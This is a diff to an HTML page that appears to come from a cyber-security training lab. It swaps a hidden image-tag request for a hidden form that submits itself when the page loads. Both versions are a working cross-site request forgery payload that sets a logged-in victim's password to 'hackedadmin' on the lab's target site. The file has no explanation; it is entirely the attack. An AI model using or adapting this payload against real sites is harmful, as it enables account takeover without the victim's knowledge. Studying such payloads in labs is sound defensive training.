@@ -1,5 +1,11 @@
 <html>
   <body>
-    <img src="http://web.npuac2h8ruyu4adbcou9.labs.cyber-ed.space/main.php?action=change_password&new_password=hackedadmin" style="display:none">
+    <form action="http://web.npuac2h8ruyu4adbcou9.labs.cyber-ed.space/main.php" method="POST" id="f">
+      <input type="hidden" name="action" value="change_password">
+      <input type="hidden" name="new_password" value="hackedadmin">
+    </form>
+    <script>
+      document.getElementById('f').submit();
+    </script>
   </body>
 </html>
